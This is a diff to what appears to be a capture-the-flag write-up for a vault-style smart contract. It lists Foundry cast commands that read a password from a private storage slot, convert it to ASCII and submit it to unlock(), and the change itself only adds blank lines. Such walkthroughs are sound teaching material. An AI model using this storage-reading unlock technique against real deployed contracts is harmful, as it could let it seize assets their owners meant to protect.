@@ -13,6 +13,7 @@ submit it to the unlock() function.
 ```exploit :
 use cast in foundry to fetch the data stored inside private variable slots.
 cast storage <addr> 1 --rpc-url $RPC_URL
+
 ```
 
 conv the password to ASCII
@@ -20,6 +21,7 @@ cast --to-ascii <passwd>
 
 make a fn call to unlock()
 ```cast send <addr> "unlock(bytes32)" "passwd" --private-key $PKEY --rpc-url $RPC_URL
+
 ```
 
 
